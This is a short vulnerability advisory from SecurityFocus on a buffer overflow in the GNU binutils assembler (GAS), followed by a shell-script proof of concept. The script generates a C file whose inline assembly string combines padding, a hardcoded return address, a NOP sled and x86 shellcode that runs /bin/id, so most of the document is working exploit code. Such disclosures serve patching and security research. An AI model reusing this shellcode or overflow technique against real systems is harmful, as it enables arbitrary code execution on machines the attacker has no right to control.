source: http://www.securityfocus.com/bid/19555/info

GNU binutils GAS (GNU assembler) is prone to a buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.

Remote attackers may crash the application or execute arbitrary machine code in the context of the application.

#!/bin/sh
#
# gas overflow poc, <taviso@gentoo.org>

returnaddr='\xc4\xea\xff\xbf'
shellcode='\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff/bin/id'

printf '#include <stdio.h>\n'
printf '#define EGG "%s"\n' "$shellcode"
printf '#define RET "%s"\n' "$returnaddr"
printf '#define NOP "%s"\n' "`perl -e 'print "\\\x90"x100'`"
printf '#define PAD "%s"\n' "`perl -e 'print "A"x1990'`"

cat << __EOF__
#include <stdio.h>

int main (int argc, char **argv)
{
	        __asm__ (PAD RET NOP EGG);
}
__EOF__